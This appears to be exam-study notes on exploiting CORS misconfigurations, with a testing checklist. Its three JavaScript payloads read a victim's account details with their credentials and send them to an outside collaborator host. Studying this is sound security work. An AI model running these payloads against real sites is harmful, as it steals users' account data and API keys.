# CORS (Cross-Origin Resource Sharing) - Stage 2

## 🎯 Overview

CORS misconfigurations allow attackers to read sensitive data from another origin via JavaScript.

## 🔥 Attack Techniques

### Basic CORS Exploit
**Scenario:** Server reflects `Origin` header in `Access-Control-Allow-Origin`

**Vulnerable Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"username":"carlos","apikey":"secret123"}
```

**Exploit:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

---

### Null Origin Bypass
**Scenario:** Server allows `null` origin

**Test:**
```http
GET /accountDetails HTTP/1.1
Origin: null
```

**Response:**
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit (using iframe sandbox):**
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
</script>
"></iframe>
```

---

### Subdomain Wildcard Bypass
**Scenario:** Server allows any subdomain

**Test:**
```http
GET /accountDetails HTTP/1.1
Origin: https://evil.vulnerable-site.com
```

**If XSS exists on subdomain:**
```html
<script>
// On evil.vulnerable-site.com (or via XSS)
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

---

### Regex Bypass
**Scenario:** Weak regex validation of Origin

**Examples:**
```
Origin: https://vulnerable-site.com.evil.com
Origin: https://evilvulnerable-site.com
Origin: https://vulnerable-site.com.evil.com
```

## 🎓 Exam Tips

1. **Check `/accountDetails` endpoint** - Common CORS misconfiguration location
2. **Test with arbitrary Origin** - See if reflected
3. **Try `null` origin** - Use iframe sandbox
4. **Look for subdomains** - Check if wildcard allowed
5. **Combine with XSS** - XSS on subdomain + CORS = data theft

## 🔍 Testing Checklist

- [ ] Find sensitive endpoint (e.g., `/accountDetails`)
- [ ] Add `Origin: https://evil.com` header
- [ ] Check if `Access-Control-Allow-Origin` reflects it
- [ ] Check if `Access-Control-Allow-Credentials: true`
- [ ] Try `Origin: null`
- [ ] Try subdomain origins
- [ ] Create exploit to exfiltrate data
- [ ] Test with Burp Collaborator

## 📚 References

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [CORS Misconfigurations](https://portswigger.net/web-security/cors/access-control-allow-origin)
